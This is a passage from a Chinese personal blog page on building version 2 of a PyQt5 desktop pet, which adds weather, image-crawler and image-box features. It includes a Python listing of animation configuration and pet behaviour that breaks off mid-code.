<p>描绘结果如下：</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652602690664.png" class width="1652602690664"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/" class="post-title-link" itemprop="url">不务正业系列：桌宠开发Ⅱ（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-14 15:45:36" itemprop="dateCreated datePublished" datetime="2022-05-14T15:45:36+08:00">2022-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-19 22:59:50" itemprop="dateModified" datetime="2022-05-19T22:59:50+08:00">2022-05-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>31k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>28 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="桌宠开发Ⅱ"><a href="#桌宠开发Ⅱ" class="headerlink" title="桌宠开发Ⅱ"></a>桌宠开发Ⅱ</h2><p>距离上一个版本的桌宠已经1个月了，最近心血来潮，想回顾一下</p>
<p>这两天写这个东西有点上瘾，通过改 BUG，我对 PyQt5 算是熟悉一些了</p>
<h2 id="DesktopPets-v2-0"><a href="#DesktopPets-v2-0" class="headerlink" title="DesktopPets_v2.0"></a>DesktopPets_v2.0</h2><p>这次的桌宠迎来大升级，右键菜单功能补全，大大提高了互动性</p>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513650364-1652972388138.png" class width="1652513650364"> 
<p>共添加了3个功能：</p>
<ul>
<li>天气预报</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513706836-1652972388138.png" class width="1652513706836"> 
<ul>
<li>爬虫</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513732308-1652972388138.png" class width="1652513732308"> 
<ul>
<li>图片盒子</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513811854-1652972388138.png" class width="1652513811854"> 
<p>PS：“爬虫”爬取到的图片会直接被“图片盒子”读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Attached.CallWeatherWin <span class="keyword">import</span> Mainweather</span><br><span class="line"><span class="keyword">from</span> Attached.crawler <span class="keyword">import</span> Crawler</span><br><span class="line"><span class="keyword">from</span> Attached.Blankbox <span class="keyword">import</span> MainBOX</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 跳跃_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quitPet)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.heading = <span class="number">0</span></span><br><span class="line">        self.touchdown_key = <span class="number">0</span></span><br><span class="line">        self.jumpping_key = <span class="number">0</span></span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.action == <span class="number">8</span>:</span><br><span class="line">                self.jumpping_key = <span class="number">1</span></span><br><span class="line">                self.InitTimer(self.randomAct,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.touchdown_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.touchdown()</span><br><span class="line">        <span class="keyword">elif</span> self.jumpping_key == <span 